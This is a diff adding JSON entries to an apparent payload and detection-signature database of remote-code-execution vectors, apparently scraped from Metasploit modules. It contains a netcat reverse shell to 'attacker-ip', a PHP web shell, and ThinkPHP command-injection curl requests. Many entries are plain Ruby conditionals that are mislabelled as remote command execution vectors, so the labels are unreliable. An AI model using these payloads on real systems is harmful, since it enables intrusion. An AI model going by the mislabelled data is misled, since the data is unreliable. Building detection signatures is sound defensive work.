+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE require 'msf/core/exploit/powershell' [23c3d17c]",
+      "payload": "require 'msf/core/exploit/powershell'",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "require\\ 'msf/core/exploit/powershell'",
+      "tags": [
+        "powershell"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE return CheckCode::Unknown unless resp && [4ee3a95f]",
+      "payload": "return CheckCode::Unknown unless resp && resp.code == 200",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "return\\ CheckCode::Unknown\\ unless\\ resp\\ \\&\\&\\ resp\\.code\\ ==\\ 200",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE return unless res && res.code == 200 [c4b7554b]",
+      "payload": "return unless res && res.code == 200",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "return\\ unless\\ res\\ \\&\\&\\ res\\.code\\ ==\\ 200",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE system(\"sh -c 'nc attacker-ip attacker-p [a64167ff]",
+      "payload": "system(\"sh -c 'nc attacker-ip attacker-port -e /bin/sh'\");",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "system\\(\"sh\\ \\-c\\ 'nc\\ attacker\\-ip\\ attacker\\-port\\ \\-e\\ /bin/sh'\"\\);",
+      "tags": [
+        "netcat",
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE system($_GET['cmd']); [5ccd5a69]",
+      "payload": "system($_GET['cmd']);",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "system\\(\\$_GET\\['cmd'\\]\\);",
+      "tags": [
+        "system-call"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE team.submission_requirements&.mfa_requir [c295302e]",
+      "payload": "team.submission_requirements&.mfa_required_at.present? &&",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "team\\.submission_requirements\\&\\.mfa_required_at\\.present\\?\\ \\&\\&",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE type = ( target.name == 'Unix Command pa [d92fe003]",
+      "payload": "type = ( target.name == 'Unix Command payload' ? 'bash' : 'cmd' )",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "type\\ =\\ \\(\\ target\\.name\\ ==\\ 'Unix\\ Command\\ payload'\\ \\?\\ 'bash'\\ :\\ 'cmd'\\ \\)",
+      "tags": [
+        "bash"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE unless res.code == 204 && cookie.match(/ [bb8e302b]",
+      "payload": "unless res.code == 204 && cookie.match(/NXSESSIONID=[\\h-]+/)",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "unless\\ res\\.code\\ ==\\ 204\\ \\&\\&\\ cookie\\.match\\(/NXSESSIONID=\\[\\\\h\\-\\]\\+/\\)",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE unless res.code == 400 && res.body.match [3e4393b2]",
+      "payload": "unless res.code == 400 && res.body.match(/java\\.lang\\.UNIXProcess@\\h+/)",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "unless\\ res\\.code\\ ==\\ 400\\ \\&\\&\\ res\\.body\\.match\\(/java\\\\\\.lang\\\\\\.UNIXProcess@\\\\h\\+/\\)",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE unless res.code == 404 && res.body.match [14b6e060]",
+      "payload": "unless res.code == 404 && res.body.match(/copyright.*ThinkPHP/m)",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "unless\\ res\\.code\\ ==\\ 404\\ \\&\\&\\ res\\.body\\.match\\(/copyright\\.\\*ThinkPHP/m\\)",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE unless version && (build = Integer(build [5c90d894]",
+      "payload": "unless version && (build = Integer(build) rescue nil)",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "unless\\ version\\ \\&\\&\\ \\(build\\ =\\ Integer\\(build\\)\\ rescue\\ nil\\)",
+      "tags": [
+        "operator-and"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE win_obj.prepend('cmd.exe /c ') [40858559]",
+      "payload": "win_obj.prepend('cmd.exe /c ')",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "win_obj\\.prepend\\('cmd\\.exe\\ /c\\ '\\)",
+      "tags": [
+        "cmd"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE wvu@kharak:~$ curl -gvs \"http://127.0.0. [ff60596a]",
+      "payload": "wvu@kharak:~$ curl -gvs \"http://127.0.0.1:8080/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id\" | head -1",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "wvu@kharak:\\~\\$\\ curl\\ \\-gvs\\ \"http://127\\.0\\.0\\.1:8080/index\\.php\\?s=/Index/\\\\think\\\\app/invokefunction\\&function=call_user_func_array\\&vars\\[0\\]=system\\&vars\\[1\\]\\[\\]=id\"\\ \\|\\ head\\ \\-1",
+      "tags": [
+        "curl-pipe",
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE wvu@kharak:~$ curl -vs \"http://127.0.0.1 [42f3bacf]",
+      "payload": "wvu@kharak:~$ curl -vs \"http://127.0.0.1:8080/index.php?s=$((RANDOM))\" | xmllint --html --xpath 'substring-after(//div[@class = \"copyright\"]/span[1]/text(), \"V\")' -",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "wvu@kharak:\\~\\$\\ curl\\ \\-vs\\ \"http://127\\.0\\.0\\.1:8080/index\\.php\\?s=\\$\\(\\(RANDOM\\)\\)\"\\ \\|\\ xmllint\\ \\-\\-html\\ \\-\\-xpath\\ 'substring\\-after\\(//div\\[@class\\ =\\ \"copyright\"\\]/span\\[1\\]/text\\(\\),\\ \"V\"\\)'\\ \\-",
+      "tags": [
+        "curl-pipe",
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    },
+    {
+      "category": "RCE",
+      "name": "RCE wvu@kharak:~$ curl -vsd \"_method=__const [1150a760]",
+      "payload": "wvu@kharak:~$ curl -vsd \"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\" http://127.0.0.1:8081/index.php?s=captcha | head -1",
+      "description": "Remote command execution vector",
+      "confidence_score": 0.7,
+      "context": "command",
+      "detection_pattern": "wvu@kharak:\\~\\$\\ curl\\ \\-vsd\\ \"_method=__construct\\&filter\\[\\]=system\\&method=get\\&server\\[REQUEST_METHOD\\]=id\"\\ http://127\\.0\\.0\\.1:8081/index\\.php\\?s=captcha\\ \\|\\ head\\ \\-1",
+      "tags": [
+        "curl-pipe",
+        "pipe"
+      ],
+      "product": null,
+      "version_spec": null,
+      "metadata": {}
+    }
+  ]
+}
